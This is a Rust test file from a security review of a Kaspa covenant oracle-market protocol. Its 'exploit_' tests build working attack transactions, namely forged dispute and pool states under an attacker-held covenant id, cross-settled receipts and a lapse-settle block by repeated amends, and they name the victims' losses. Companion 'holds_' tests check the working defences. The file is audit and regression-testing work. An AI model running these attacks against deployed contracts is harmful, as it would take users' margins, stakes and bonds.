//! Review 6 (docs/audit/REVIEW-6.md): the oracle-market family (`KpfOpenO`, `KpfPairO`, `KpfPendingO`, `KpfBond`,
//! `KpfStake`). Every transaction here runs every input in the real script engine with the covenant context
//! (`common::run`). `exploit_` tests assert that an attack is ACCEPTED; `holds_` tests that it is refused. Worked numbers
//! use the fixture market of `oraclekit` (1,000 units at 10 KAS, long margin 1,000 KAS, short margin 2,000 KAS, cover 6,000
//! KAS, a claim's bond 600 KAS, judge stakes of 10 KAS).

mod bondkit;
mod common;
mod judgekit;
mod oraclekit;

use common::*;
use kaspa_consensus_core::tx::{TransactionOutpoint, UtxoEntry};
use kaspa_consensus_core::Hash;
use kpf_protocol::bond::{BindArgs, Claim, Ctx};
use kpf_protocol::judge::{Js, NO, STATUS_DISPUTE, STATUS_RESOLVED, UNIT, YES};
use kpf_protocol::oracle::*;
use oraclekit::*;
use secp256k1::Keypair;

const KAS: i64 = 100_000_000;
const FALSE_P: i64 = 920_000_000;

fn liq(side: i64, n: i64, p: i64, t0: i64) -> ClaimSpec {
    ClaimSpec { kind: LIQ, side, n, p, t0, lock: t0 as u64 }
}

fn contest_at(lw: &LPend, seed: u8, v: u64, daa: u64) -> (LPend, LStake, LStake) {
    let st = stake(seed, v, 0, 0x90 + seed);
    let (t, w2, r, d) = contest_tx(lw, &st, seed, daa);
    must("contest", &t);
    (live(&t, 0, daa, &w2), live(&t, 1, daa, &r), live(&t, 2, daa, &d))
}

/// The attacker's own key (never the underwriter's key; its counterparty key in the attacks).
fn attacker() -> Keypair {
    keypair(50)
}

/// A plain P2PK UTXO that carries a covenant id: the attacker's handle on that id.
#[derive(Clone)]
struct Handle {
    op: TransactionOutpoint,
    utxo: UtxoEntry,
}

impl Handle {
    fn id(&self) -> Hash {
        self.utxo.covenant_id.unwrap()
    }
    fn input(&self) -> In {
        In { outpoint: self.op, utxo: self.utxo.clone(), spend: Spend::P2pk(attacker()) }
    }
}

/// Step 0: the attacker makes a covenant id of its own with an ordinary genesis: one P2PK output of its key bound to a
/// fresh id. Consensus accepts it (the genesis id is the hash of the authorizing outpoint and the output).
fn make_handle() -> Handle {
    let ins = vec![key_in(outpoint(0x30), 10_000_000_000, 0, &attacker())];
    let mut outs = vec![out(5_000_000_000, p2pk_spk(&attacker()), None), out(4_000_000_000, p2pk_spk(&attacker()), None)];
    let g = genesis_id(outpoint(0x30), &outs, &[0]);
    outs[0].covenant = bind(0, g);
    let t = build_ext(&ins, outs, 0, &[0]);
    must("the attacker's genesis of a P2PK UTXO with its own covenant id", &t);
    let (op, utxo) = utxo_of(&t.0, 0);
    Handle { op, utxo }
}

/// The next handle: output `j` of `t` (a P2PK continuation of the attacker's id).
fn handle_at(t: &T, j: usize) -> Handle {
    let (op, utxo) = utxo_of(&t.0, j);
    Handle { op, utxo }
}

/// The attacker uses its handle on the id to write any KpfStake state under that id (here: a dispute or a resolved
/// pool); out 0 the forged UTXO, out 1 the handle again. Returns the forged UTXO (at `daa`) and the next handle.
fn forge(h: &Handle, s: &Js, value: u64, daa: u64) -> (LStake, Handle) {
    let id = h.id();
    let ins = vec![h.input(), key_in(outpoint(0x31), 50_000_000_000, 0, &attacker())];
    let outs = vec![out(value, stake_spk(s), bind(0, id)), out(1_000_000_000, p2pk_spk(&attacker()), bind(0, id)), out(40_000_000_000, p2pk_spk(&attacker()), None)];
    let t = build_ext(&ins, outs, 0, &[0, 0]);
    must("the attacker writes a KpfStake state under the id it holds", &t);
    (live(&t, 0, daa, s), handle_at(&t, 1))
}

/// A forged dispute naming the contested part `cw`: YES leads, its round started at DAA 0, so it resolves at once.
fn forged_dispute(cw: &LPend) -> Js {
    let jm = cw.s.m.judge_market();
    Js { status: STATUS_DISPUTE, side: YES, yes: 10 * UNIT, yes_u: 10, no: 0, no_u: 0, start: 0, ..Js::opened(jm, spk_hash(&pend_spk(&cw.s)), cw.s.clock, 0) }
}

/// The resolution of the forged dispute decides the honestly contested part UPHELD, and the part finalizes into the
/// forfeit (both keys the attacker's). Returns the settlement.
fn forged_verdict_and_forfeit(h: &Handle, cw: &LPend) -> Settlement {
    let (ld, _) = forge(h, &forged_dispute(cw), DISPUTE_BASE, cw.daa + 5);
    let (dt, _, dw) = decide_tx(&ld, cw, cw.daa + 10);
    must("the forged dispute resolves onto the honestly contested part", &dt);
    assert_eq!(dw.status, UPHELD, "a false claim contested in time is upheld");
    let dwl = live(&dt, 1, cw.daa + 10, &dw);
    let (ft, s) = finalize_tx(&dwl, cw.s.clock, 0);
    must("finalize the upheld false claim", &ft);
    s
}

/// `KpfOpenO.take` into a part whose covenant id the attacker holds: in 0 the attacker's handle (P2PK of id Z: it
/// authorizes the part and its own continuation), 1 the victim's resting long order (take), 2 the attacker's slot
/// (bind of the part at its expiry: the cover is counted), 3 the attacker's funding; out 0 the handle again (id Z), 1
/// the order's continuation, 2 the part (id Z), 3 the slot, 4 change. The short of the part is the attacker's key.
fn take_into_handle(h: &Handle, lo: &LOrder, sl: &LSlot, lock: u64) -> (T, OPair) {
    let k = kit();
    let o = &lo.s;
    let n = 1_000_000_000i64;
    let xp = 1_000_000_000i64;
    let bound = 1_200_000_000i64; // the attacker's short bound: bs - x = 2 KAS >= minCounterRate 1.5 KAS
    let b = OBinding { uw_id: sl.idb(), uw_key: sl.s.owner, cover_rate: 600_000_000, expiry: 1_200, premium: 2_000_000 };
    let part = OPair {
        m: o.m,
        size: n,
        bl: xp - o.my_rate,
        bs: bound,
        entry: xp,
        long_key: o.owner,
        short_key: x(&attacker()),
        b,
        long_ask: 0,
        long_min: 0,
        long_tip: 0,
        short_bid: 0,
        short_min: 0,
        short_tip: 0,
        tag_l: lo.idb(),
        tag_s: [0; 32],
    };
    let cover = part.cover_of(n);
    let a = BindArgs::new(lock as i64, b.expiry, 0, &[Claim::output(2, cover)]);
    let ctx = Ctx { lock: lock as i64, seq: 10, v_in: sl.value as i64, cov_in: 1, cov_out: 1, signed: true, has_id: true };
    let b2 = sl.s.bind(&ctx, &a, sl.value as i64).expect("the slot counts the part");
    let take_args = vec![
        iv(2),
        iv(n),
        iv(xp),
        iv(xp),
        iv(bound),
        bv(&x(&attacker())),
        iv(0),
        iv(0),
        iv(0),
        iv(2),
        iv(0),
        iv(b.expiry),
        iv(b.cover_rate),
        iv(b.premium),
        bv(&k.pair.prefix),
        bv(&k.pair.suffix),
    ];
    let ins = vec![h.input(), order_in(lo, "take", take_args), slot_in(sl, "bind", bind_args(&a, &uw_kp())), key_in(outpoint(0x32), 900_000_000_000, 0, &attacker())];
    let (oc, ov) = order_after(lo, n, o.take_spend(n));
    let id = h.id();
    let outs = vec![
        out(1_000_000_000, p2pk_spk(&attacker()), bind(0, id)),
        out(ov, order_spk(&oc.expect("the order rests on")), bind(1, lo.id.unwrap())),
        out(part.floor() as u64, pair_spk(&part), bind(0, id)),
        out(sl.value, bond_spk(&b2), bind(2, sl.id.unwrap())),
        out(600_000_000_000, p2pk_spk(&attacker()), None),
    ];
    (build_ext(&ins, outs, lock, &[0, 0, 10, 0]), part)
}

// ---------------------------------------------------------------- F1: a part under an id the attacker holds

/// F1 (Critical). A resting order is taken into a part whose covenant id the attacker also holds through a plain P2PK
/// UTXO; `take` checks only that the part's id is not zero. With that handle the attacker writes a KpfStake dispute
/// under the part's id at will, naming the contested part's script: a false liquidation that an honest staker contests
/// in time is decided UPHELD by the forged dispute and finalizes into the forfeit.
/// Who loses: the order's owner (offline, it signed only its order) loses its whole margin, 1,000 KAS, against the
/// documented promise that a false price contested in time is reversed; the honest disputer's 10 KAS receipt is left
/// in a dispute that can never resolve (its claim was decided by the forgery). The attacker (counterparty key + its own
/// slot as underwriter, uwAccept zero) gets the forfeited part (3,000 KAS less the fee) and its bond back.
#[test]
fn exploit_take_into_a_held_id_lets_a_forged_dispute_uphold_a_contested_false_claim() {
    let h = make_handle();
    let victim = keypair(46);
    let lo = order(L, &victim, 0x7a, 0);
    let sl = slot(K);
    let (t, part) = take_into_handle(&h, &lo, &sl, 400);
    must("the victim's order enters a part whose id the attacker holds", &t);
    let lp = live(&t, 2, 400, &part);
    let h = handle_at(&t, 0);
    assert_eq!(lp.id, Some(h.id()), "the part and the attacker's P2PK UTXO share one covenant id");
    // The attacker's underwriter key vouches a false liquidation of the victim's long (true price 10 KAS).
    let lw = proposed(&lp, &liq(L, part.size, FALSE_P, 450), 500);
    // An honest staker contests in time (P + 20 < P + W).
    let (cw, _r, _d) = contest_at(&lw, 70, 10 * UNIT as u64, 520);
    let s = forged_verdict_and_forfeit(&h, &cw);
    let Settlement::Forfeit { part: f, value, .. } = s else { panic!("forfeit expected: {s:?}") };
    assert_eq!((f.long_key, f.short_key), (x(&attacker()), x(&attacker())), "the forfeited part is the attacker's alone");
    println!("take into a held id: the victim's long margin {} KAS is taken although the claim was contested in time; the forfeited part holds {} KAS", lp.s.long_at(1_000_000_000) / KAS, value as f64 / KAS as f64);
    assert_eq!(lp.s.long_at(1_000_000_000), 1_000 * KAS);
}

/// F1, the stakers' side. With the same handle the attacker writes a RESOLVED pool under the part's id with the
/// honest dispute's anchor, NO as the loser and a base equal to everything it will hold; the honest opener's receipt
/// (or any receipt of any dispute on this part, before or after its own resolution) is settled into it as a loser
/// (anyone may settle; `redeem` checks only the id, the status and the anchor), and the pool closes to its closer.
/// Who loses: every honest staker who contests or defends any claim on the part: here the opener's 10 KAS, all of it
/// to the attacker (no burn: the forged base covers the whole value).
#[test]
fn exploit_a_held_id_lets_a_forged_pool_take_every_honest_receipt() {
    let h = make_handle();
    let lo = order(L, &keypair(46), 0x7a, 0);
    let (t, part) = take_into_handle(&h, &lo, &slot(K), 400);
    must("take", &t);
    let lp = live(&t, 2, 400, &part);
    let h = handle_at(&t, 0);
    // Any claim at all (here a true one at 9.00 is not even needed: a false one is used to keep the fixture).
    let lw = proposed(&lp, &liq(L, part.size, FALSE_P, 450), 500);
    let (_cw, r, _d) = contest_at(&lw, 70, 10 * UNIT as u64, 520);
    let jm = lp.s.m.judge_market();
    let pool_v = DISPUTE_BASE;
    let fake = Js { status: STATUS_RESOLVED, side: YES, anchor: r.s.anchor, w_left: 0, l_left: r.s.amt, base: pool_v as i64 + r.value as i64, start: 0, ..Js::opened(jm, [0; 32], r.s.anchor, 0) };
    let fake = Js { no: r.s.amt, no_u: 0, yes: 0, yes_u: 0, ..fake };
    let (lpool, _) = forge(&h, &fake, pool_v, 530);
    let (st, p2, pays) = settle_tx(&lpool, &[r.clone()], 531);
    must("the honest receipt is forfeited into the forged pool", &st);
    assert_eq!(pays, vec![0], "the honest opener is paid nothing");
    let lp2 = live(&st, 0, 531, &p2);
    assert_eq!(lp2.value, pool_v + r.value);
    let (ct, burn) = pool_close_tx(&lp2);
    must("the forged pool closes to its closer", &ct);
    assert_eq!(burn, 0, "nothing is burned: the forged base is the whole value");
    assert_eq!(ct.0.outputs[0].value, pool_v + r.value, "the closer takes the honest staker's 10 KAS");
}

/// F1, against the underwriter. The forgery works for NO as well: when the attacker's own short is truly liquidatable
/// (here at 12.50 KAS, above its bound of 12), the honest underwriter vouches the liquidation and posts its 600 KAS bond;
/// the attacker contests with its own aged stake and resolves a forged dispute led by NO onto the part: REFUTED. The
/// part is restored and the bond paid to the defender (the attacker's short, 480 KAS) and the disputer (the attacker's
/// stake key, 120 KAS). Who loses: the honest underwriter 600 KAS per true claim, as often as it vouches; the long, its
/// due liquidation (1,000 KAS of winnings stay in a pair that only lapses at its entry).
#[test]
fn exploit_a_held_id_refutes_a_true_claim_and_takes_the_underwriters_bond() {
    let h = make_handle();
    let lo = order(L, &keypair(46), 0x7a, 0);
    let (t, part) = take_into_handle(&h, &lo, &slot(K), 400);
    must("take", &t);
    let lp = live(&t, 2, 400, &part);
    let h = handle_at(&t, 0);
    let truth = 1_250_000_000;
    assert!(lp.s.short_liquidatable(truth), "the short is truly past its trigger");
    let lw = proposed(&lp, &liq(S, part.size, truth, 450), 500);
    let (cw, _, _) = contest_at(&lw, 50, 10 * UNIT as u64, 520);
    assert_eq!(cw.s.disputer, x(&attacker()));
    let jm = cw.s.m.judge_market();
    let no_led = Js { status: STATUS_DISPUTE, side: NO, no: 10 * UNIT, no_u: 10, yes: 0, yes_u: 0, start: 0, ..Js::opened(jm, spk_hash(&pend_spk(&cw.s)), cw.s.clock, 0) };
    let (ld, _) = forge(&h, &no_led, DISPUTE_BASE, 525);
    let (dt, _, dw) = decide_tx(&ld, &cw, 530);
    must("the forged NO dispute resolves onto the true claim", &dt);
    assert_eq!(dw.status, REFUTED);
    let (ft, s) = finalize_tx(&live(&dt, 1, 530, &dw), 500, 0);
    must("restore, the bond to the attacker", &ft);
    let Settlement::Restore { defender, disputer, .. } = s else { panic!("{s:?}") };
    assert_eq!((defender, disputer), (480 * KAS, 120 * KAS));
    assert_eq!(lw.s.defender(), x(&attacker()));
}

/// F1 by close-versus-close: a donor's listed short closes against a "host" that is not a pair at all but the
/// attacker's P2PK UTXO of an id it holds; `closeDonor` checks P3's script, binding bounds and value, never the host,
/// so the donor's passive long is moved into P3 under the attacker's id (its short the attacker's key). The donor's
/// underwriter (colluding) vouches a false liquidation of P3's long, an honest staker contests in time, the forged
/// dispute upholds it. Who loses: the donor's long, who signed nothing, 1,000 KAS; the donor's short is paid in full.
#[test]
fn exploit_close_donor_into_a_held_id_moves_the_long_beyond_the_judge() {
    let (lp, _, _) = opened();
    let (at, listed) = amend_tx(&lp, S, &short_kp(), 1_000_000_000, 20);
    must("the donor's short lists at 10 KAS", &at);
    let donor = live(&at, 0, 400, &listed);
    let h = make_handle();
    let d = &donor.s;
    let n = d.size;
    let xp = 1_000_000_000i64;
    let mut p3 = d.rest_of(n);
    p3.short_key = x(&attacker());
    (p3.short_bid, p3.short_min, p3.short_tip) = (0, 0, 0);
    p3.tag_l = donor.idb();
    let donor_args = vec![iv(n), iv(xp), iv(d.entry), iv(2), iv(d.bs), bv(&x(&attacker())), iv(0), iv(0), iv(0), iv(d.b.cover_rate), iv(d.b.expiry), iv(d.b.premium)];
    let spay = kpf_protocol::payoff::owed(n, d.bs - xp, d.short_tip, d.m.p.scale) + donor.value as i64 - d.range_of(n);
    let id = h.id();
    let ins = vec![h.input(), pair_in(&donor, "closeDonor", donor_args), key_in(outpoint(0x33), 900_000_000_000, 0, &attacker())];
    let outs = vec![
        out(1_000_000_000, p2pk_spk(&attacker()), bind(0, id)),
        out(spay as u64, key_spk(&d.short_key), None),
        out(p3.floor() as u64, pair_spk(&p3), bind(0, id)),
        out(600_000_000_000, p2pk_spk(&attacker()), None),
    ];
    let t = build_ext(&ins, outs, 0, &[0, seq_quiet(&donor), 0]);
    must("closeDonor against a host that is the attacker's P2PK UTXO", &t);
    let lp3 = live(&t, 2, 450, &p3);
    let h = handle_at(&t, 0);
    let lw = proposed(&lp3, &liq(L, n, FALSE_P, 460), 500);
    let (cw, _, _) = contest_at(&lw, 70, 10 * UNIT as u64, 520);
    let s = forged_verdict_and_forfeit(&h, &cw);
    assert!(matches!(s, Settlement::Forfeit { .. }), "{s:?}");
    assert_eq!(lp3.s.long_at(1_000_000_000), 1_000 * KAS);
}

/// F1, why requiring a pair input in `take` is not enough: a pair written by a genesis together with a P2PK twin of
/// its id (no scan runs at a genesis that no order takes part in) is a real KpfPairO instance; an order taking its
/// listing through the pair's own `transfer` lands under the id the twin holds, and the forgery follows as above. The
/// documented look-alike limit says such an entrant is "protected on chain" by the fresh bind; the bind counts the
/// cover but cannot stop the forged verdict. Who loses: the order's owner, 1,000 KAS.
#[test]
fn exploit_an_order_taking_a_genesis_pair_with_a_twin_lands_under_a_held_id() {
    let (lp, sl, _) = opened();
    let mut gp = lp.s.clone();
    (gp.long_ask, gp.tag_l, gp.tag_s) = (1_000_000_000, [0; 32], [0; 32]);
    let ins = vec![key_in(outpoint(0x35), 900_000_000_000, 0, &attacker())];
    let mut outs = vec![out(lp.value, pair_spk(&gp), None), out(1_000_000_000, p2pk_spk(&attacker()), None), out(500_000_000_000, p2pk_spk(&attacker()), None)];
    let g = genesis_id(outpoint(0x35), &outs, &[0, 1]);
    outs[0].covenant = bind(0, g);
    outs[1].covenant = bind(0, g);
    let t = build_ext(&ins, outs, 0, &[0]);
    must("a genesis of a look-alike pair and a P2PK twin of its id", &t);
    let fake = live(&t, 0, 380, &gp);
    let h = handle_at(&t, 1);
    let lo = order(L, &keypair(46), 0x7a, 0);
    let (tt, part) = take_tx(&fake, &lo, &sl, 1_000_000_000, 400, true);
    must("the order takes the look-alike's listing with the fresh bind", &tt);
    let lpart = live(&tt, 2, 400, &part);
    assert_eq!(lpart.id, Some(h.id()));
    let lw = proposed(&lpart, &liq(L, part.size, FALSE_P, 450), 500);
    let (cw, _, _) = contest_at(&lw, 70, 10 * UNIT as u64, 520);
    assert!(matches!(forged_verdict_and_forfeit(&h, &cw), Settlement::Forfeit { .. }));
}

/// The same forged dispute cannot reach a part of an honestly opened pair: no UTXO but the lineage's own carries its
/// id, so the forgery cannot be written (the covenant context refuses an output of the id without an input of it).
#[test]
fn holds_a_pair_opened_by_fill_has_no_handle_for_a_forgery() {
    let (lp, _, _) = opened();
    let lw = proposed(&lp, &liq(L, lp.s.size, FALSE_P, 450), 500);
    let (cw, _, _) = contest_at(&lw, 70, 10 * UNIT as u64, 520);
    let ins = vec![key_in(outpoint(0x34), 10_000_000_000, 0, &attacker())];
    let outs = vec![out(DISPUTE_BASE, stake_spk(&forged_dispute(&cw)), bind(0, cw.id.unwrap()))];
    let t = build_ext(&ins, outs, 0, &[0]);
    assert!(run(&t.0, &t.1).is_err(), "no output of the pair's id without an input of it");
}

// ---------------------------------------------------------------- F2: two disputes of one id with one anchor

/// Two pair UTXOs of one lineage (here a part restored after a void claim and the remainder) and two claims proposed
/// on them in two independent transactions that land in the same chain block: both pending parts have the same DAA
/// score P, so their disputes have the same id and the same anchor.
fn two_disputes_one_anchor() -> (LStake, LStake, LStake, LStake, LStake, LStake) {
    let (lp, _, _) = opened();
    let half = lp.s.size / 2;
    // A void claim (t0 too early) on half the pair splits it: pending part + remainder, both at 450.
    let (t, w) = propose_tx(&lp, &liq(L, half, FALSE_P, 349), &uw_kp(), None);
    must("a void claim on half", &t);
    let lw = live(&t, 0, 450, &w);
    let rest = live(&t, 1, 450, &lp.s.rest_of(lp.s.size - half));
    let (ft, s) = finalize_tx(&lw, 450, 200);
    must("void: restored", &ft);
    let Settlement::Restore { part, .. } = s else { panic!() };
    let a = live(&ft, 1, 650, &part);
    // Two independent claims, accepted by one chain block: P = 700 for both.
    let wa = proposed(&a, &liq(L, half, FALSE_P, 690), 700);
    let wb = proposed(&rest, &liq(L, half, 900_000_000, 690), 700);
    assert_eq!(wa.id, wb.id);
    let (ca, ra, da) = contest_at(&wa, 70, 10 * UNIT as u64, 720);
    let (cb, rb, db) = contest_at(&wb, 71, 10 * UNIT as u64, 720);
    assert_eq!((ra.s.anchor, rb.s.anchor), (700, 700));
    // Dispute A (the false claim): the attacker defends it with 20 KAS on YES; honest stakers answer 25 on NO: NO wins.
    let (t, da2, ry) = deposit_tx(&da, YES, &[(stake(80, 20 * UNIT as u64, 0, 0xb0), 80)], 730);
    must("the attacker's YES in A", &t);
    let ry = live(&t, 1, 730, &ry[0]);
    let (t, da3, _) = deposit_tx(&live(&t, 0, 730, &da2), NO, &[(stake(72, 25 * UNIT as u64, 0, 0xb1), 72)], 740);
    must("honest NO in A", &t);
    let (dta, pool_a, _) = decide_tx(&live(&t, 0, 740, &da3), &ca, 840);
    must("A resolves NO", &dta);
    // Dispute B (the true claim): an honest defender puts 20 KAS on YES; YES wins.
    let (t, db2, rw) = deposit_tx(&db, YES, &[(stake(81, 20 * UNIT as u64, 0, 0xb2), 81)], 730);
    must("honest YES in B", &t);
    let rw = live(&t, 1, 730, &rw[0]);
    let (dtb, pool_b, _) = decide_tx(&live(&t, 0, 730, &db2), &cb, 830);
    must("B resolves YES", &dtb);
    let _ = (ra, cb);
    (live(&dta, 0, 840, &pool_a), live(&dtb, 0, 830, &pool_b), ry, rw, rb, live(&t, 0, 730, &db2))
}

/// F2 (High). Receipts of two disputes of the same pair lineage with the same anchor settle in each other's pools:
/// `settle` and `redeem` check the id and the anchor, never which dispute the receipt joined. The attacker's YES
/// receipt, a loser in dispute A, is settled as a winner in pool B (where YES won) and paid its 20 KAS back plus the
/// whole of B's winners' share (9 KAS); B's honest YES winner can then never be paid in B (its weight is used up) and
/// is forfeited into pool A as a loser instead. Who loses: the honest winner of B, its 20 KAS stake and its 9 KAS
/// share (29 KAS); the attacker turns a 20 KAS loss into a 9 KAS gain.
#[test]
fn exploit_receipts_of_two_disputes_with_one_anchor_settle_in_the_wrong_pool() {
    let (pool_a, pool_b, ry, rw, rb, _) = two_disputes_one_anchor();
    assert_eq!(pool_a.s.side, NO);
    assert_eq!(pool_b.s.side, YES);
    // In B: B's own loser (the NO opener) and the attacker's receipt from A (a YES receipt: a "winner" here).
    let (st, p2, pays) = settle_tx(&pool_b, &[rb, ry.clone()], 900);
    must("A's losing receipt is paid as a winner of B", &st);
    assert_eq!(pays[1], ry.value + 9 * UNIT as u64, "20 KAS back and B's whole share of 9 KAS");
    let lb = live(&st, 0, 900, &p2);
    assert_eq!(lb.s.w_left, 0, "B's winning weight is used up");
    refused("B's honest winner can no longer be paid in B", &settle_tx(&lb, &[rw.clone()], 901).0, 0);
    // ... and it is forfeited into A as a loser (A's YES total is the attacker's 20 KAS, exactly its amount).
    let (st, _, pays) = settle_tx(&pool_a, &[rw.clone()], 902);
    must("B's honest winner forfeited into A", &st);
    assert_eq!(pays, vec![0]);
}

// ---------------------------------------------------------------- F3: the lapse settle can be blocked forever

/// F3 (Medium). Once the cover has lapsed, `lapseSettle` needs the pair UTXO `idleDaa` old, and `amend` (any party,
/// quietDaa old, no other condition) re-creates the UTXO, so its age restarts. A party for which the entry-price
/// settlement is bad (the side winning at the market) amends once per idleDaa (7 days on testnet, 0.028 KAS of fees)
/// and keeps the pair alive forever, with no underwriter, no price and no way for the other party to settle: the exit
/// the design promises "needs nobody" now needs the blocker's consent (a cooperative or mutual close at its price, or
/// a taker for a pair nobody can settle).
#[test]
fn exploit_a_party_blocks_the_lapse_settle_forever_by_amending() {
    let (lp, _, _) = opened();
    let mut cur = lp.clone();
    for i in 0..3u64 {
        let daa = 1_400 + 999 * i;
        let (t, c) = amend_tx(&cur, S, &short_kp(), 0, cur.s.m.p.quiet_daa as u64);
        must("the short amends a lapsed pair (quietDaa old only)", &t);
        cur = live(&t, 0, daa, &c);
        // The fresh UTXO is younger than idleDaa until the next amend: lapse settle needs sequence idleDaa.
        refused("lapse settle with less than idleDaa of age", &lapse_tx(&cur, daa + 999, cur.s.m.p.idle_daa as u64 - 1), 0);
    }
    must("the lapse settle the blocker avoids", &lapse_tx(&cur, 5_000, cur.s.m.p.idle_daa as u64));
}

/// The book family's guard does not apply here either: a lapsed pair has no underwriter, so no claim can end it.
#[test]
fn holds_no_claim_is_valid_on_a_lapsed_pair() {
    let (lp, _, _) = opened();
    let lw = proposed(&lp, &liq(L, lp.s.size, FALSE_P, 1_390), 1_400);
    let (t, s) = finalize_tx(&lw, 1_400, 200);
    must("void", &t);
    assert!(matches!(s, Settlement::Restore { .. }));
}
